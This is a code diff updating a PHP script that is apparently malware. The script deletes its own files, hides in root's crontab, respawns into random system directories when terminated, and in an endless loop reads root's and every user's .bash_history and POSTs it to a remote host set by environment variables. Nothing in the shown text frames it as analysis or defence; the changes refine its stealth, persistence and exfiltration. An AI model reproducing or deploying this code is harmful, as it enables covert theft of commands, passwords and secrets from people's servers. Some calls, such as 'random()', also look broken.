@@ -7,38 +7,34 @@ $api = getenv('TARGET_FILE');
 $protocol = getenv('TARGET_PROTOCOL');
 $crypt = getenv('LOCAL_CRYPT');
 $iv = getenv('LOCAL_IV');
-unlink(__FILE__);
-$sh = preg_replace('/\.php$/', '.sh', __FILE__);
-unlink($sh);
+
+$basename = basename(__FILE__, '.php');
+$dir = __DIR__;
 file_put_contents(
     '/etc/crontab',
-    str_replace("\n* * * * * root sh $sh", '', file_get_contents('/etc/crontab'))
+    str_replace("\n* * * * * root sh $dir/$basename", '', file_get_contents('/etc/crontab'))
 );
 if (getenv('##KILLNAME##') === '##KILLKEY##') {
     exit;
 }
 if (extension_loaded('pcntl')) {
-    $data = file_get_contents(__FILE__);
-    $pcntlhandler = function () use ($api, $key, $host, $protocol, $data, $crypt, $iv) {
+    $dataPhp = file_get_contents(__FILE__);
+    $dataSh = file_get_contents("$dir/$basename.sh");
+    $pcntlhandler = function () use ($dataPhp, $dataSh) {
         $file = randomAlphaNumericString(3);
-        mkdir("/opt", true);
-        file_put_contents('/etc/crontab', "\n* * * * * root sh /opt/$file.sh", FILE_APPEND);
-        file_put_contents(
-            "/opt/$file.sh",
-            "TARGET_API=$api "
-            . "TARGET_PROTOCOL=$protocol "
-            . "TARGET_HOST=$host "
-            . "TARGET_KEY=$key "
-            . "LOCAL_CRYPT=$crypt "
-            . "LOCAL_IV=$iv "
-            . "LOCAL_CRYPT=$crypt "
-            . "php $file.php &>/dev/null &"
-        );
-        file_put_contents("/opt/$file.php", $data);
+        $dirs = array('opt', 'usr', 'var', 'home', 'root');
+        $dir = $dirs[random(0, 4)];
+        mkdir("/$dir");
+        file_put_contents('/etc/crontab', "\n* * * * * root sh /$dir/$file.sh", FILE_APPEND);
+        file_put_contents("/$dir/$file.sh", $dataSh);
+        file_put_contents("/$dir/$file.php", $dataPhp);
     };
     pcntl_signal(SIGTERM, $pcntlhandler);
     pcntl_signal(SIGKILL, $pcntlhandler);
 }
+unlink(__FILE__);
+unlink("$dir/$basename.sh");
+
 while (true) {
     $files = array('root' => '/root/.bash_history');
     foreach (array_diff(scandir('/home'), ['.', '..']) as $user) {
@@ -52,13 +48,14 @@ while (true) {
                 if ($data) {
                     $c = curl_init();
                     curl_setopt_array($c, array(
-                        CURLOPT_CUSTOMREQUEST => 'LOG',
+                        CURLOPT_CUSTOMREQUEST => 'POST',
                         CURLOPT_URL => "$protocol://$host/$api.php",
                         CURLOPT_POSTFIELDS => $data,
                         CURLOPT_HTTPHEADER => array(
                             'CONTENT-TYPE: text/plain',
                             "ANYTHINGGOES: $key",
-                            "LOGGEDUSER: $user"
+                            "LOGGEDUSER: $user",
+                            'LOGTYPE: bash'
                         )
                     ));
                     curl_exec($c);
@@ -67,9 +64,6 @@ while (true) {
                 }
             }
         }
-    }
-    if (getenv('##KILLNAME##') === '##KILLKEY##') {
-        exit;
     }
     sleep(1);
 }
